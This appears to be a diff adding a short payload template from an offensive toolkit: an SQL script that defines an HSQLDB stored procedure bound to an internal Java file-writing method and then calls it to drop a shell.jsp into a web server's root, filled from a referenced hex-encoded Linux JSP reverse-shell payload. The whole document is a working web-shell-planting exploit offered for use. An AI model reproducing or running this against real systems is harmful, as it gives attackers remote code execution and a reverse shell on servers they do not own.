@@ -1,0 +1,6 @@
+CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
+LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
+'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
+
+call writetofile('/path/ROOT/shell.jsp', cast ('<%=$(esh payloads/revshell-linux-jsp-bash-hexencoded)%>' AS VARBINARY(1024)))
+
